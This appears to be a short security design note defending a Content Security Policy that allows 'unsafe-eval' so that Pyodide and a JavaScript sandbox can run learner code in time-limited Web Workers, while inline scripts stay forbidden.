    A weakened control can be acceptable when the need is real and the compensating controls are explicit: Pyodide and the JavaScript sandbox need eval and WebAssembly, and learner code runs in Web Workers with no DOM that are terminated at a time limit, the JavaScript worker also losing its network APIs. The policy still forbids inline scripts, which blocks the most common injection payloads. 'unsafe-eval' governs script execution, not CSS, 'unsafe-inline' would weaken the policy further rather than cancel anything, and removing 'unsafe-eval' outright would break the runners.
```
